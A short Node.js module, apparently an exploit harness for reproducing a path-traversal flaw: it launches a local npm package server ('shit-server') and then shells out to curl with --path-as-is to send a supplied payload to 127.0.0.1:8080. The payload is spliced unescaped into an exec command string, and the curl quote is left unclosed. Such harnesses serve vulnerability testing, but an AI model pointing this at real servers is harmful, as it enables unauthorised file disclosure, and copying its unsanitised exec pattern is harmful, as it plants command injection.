const path = require("path"); // Import the path module
const { exec } = require("child_process");
const sleep = require("sleep");

function exploitFunction(payload) {
  let server = "node ./node_modules/shit-server/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${payload}`;
  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error executing attack: ${error}`);
    } else {
      return stdout;
    }
  });
}

module.exports = { exploitFunction };